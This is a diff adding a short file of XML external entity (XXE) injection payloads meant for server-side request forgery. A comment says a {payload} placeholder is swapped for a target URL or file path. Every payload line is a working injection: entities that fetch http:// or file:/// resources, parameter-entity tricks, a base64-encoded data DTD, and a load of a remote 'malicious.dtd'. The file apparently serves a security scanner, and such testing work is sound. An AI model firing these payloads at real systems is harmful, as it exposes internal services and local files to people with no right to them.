@@ -1,0 +1,7 @@
+<!-- Payloads for XXE-based SSRF. {payload} will be replaced by the target URL or file path. -->
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{payload}">]><root>&xxe;</root>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///{payload}">]><root>&xxe;</root>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{payload}"><!ENTITY % dtd SYSTEM "data://text/plain;base64,PCFET0NUWVBFIGRhdGEgWzwhRU5USVRZICUgcmVzdWx0IFNZU1RFTSAlcHJvdG87JT5dPg=="><!ENTITY % proto "http://{payload}">%dtd;]><root/>
+<?xml version="1.0" ?><!DOCTYPE a [<!ENTITY % xxe SYSTEM "http://{payload}"> %xxe;]><foo/>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://{payload}" >]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://{payload}"><!ENTITY % all "<!ENTITY &#x25; M SYSTEM 'http://{payload}/malicious.dtd'> &#x25;M;">%all;]>
